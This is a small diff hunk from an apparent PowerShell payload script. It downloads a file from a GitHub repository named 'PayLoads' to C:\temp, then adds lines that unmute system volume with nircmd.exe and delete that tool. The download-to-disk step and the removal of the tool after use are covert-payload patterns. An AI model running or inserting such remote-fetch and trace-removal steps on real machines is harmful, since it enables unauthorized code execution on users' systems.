@@ -9,3 +9,6 @@ $url2 = "https://raw.githubusercontent.com/philcharlesjackson/PayLoads/main/newf
 $output2 = "C:\temp\script.ps1"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
 
+C:\temp\nircmd.exe mutesysvolume 0
+Remove-Item C:\temp\nircmd.exe
+
